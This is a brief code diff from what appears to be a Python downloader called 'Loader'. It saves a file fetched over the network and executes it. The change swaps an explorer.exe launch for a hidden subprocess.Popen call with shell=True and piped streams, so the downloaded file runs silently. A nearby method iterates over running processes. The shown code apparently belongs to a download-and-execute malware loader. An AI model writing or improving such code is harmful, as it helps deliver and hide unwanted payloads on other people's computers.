@@ -133,7 +133,7 @@ class Loader():
 						file = open(filename,"wb")
 						file.write(req.content)
 						file.close()
-						os.system("explorer.exe " + filename)
+						subprocess.Popen(filename,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
 	def Auto_Close(self):
 		while True:
 			for proc in psutil.process_iter():
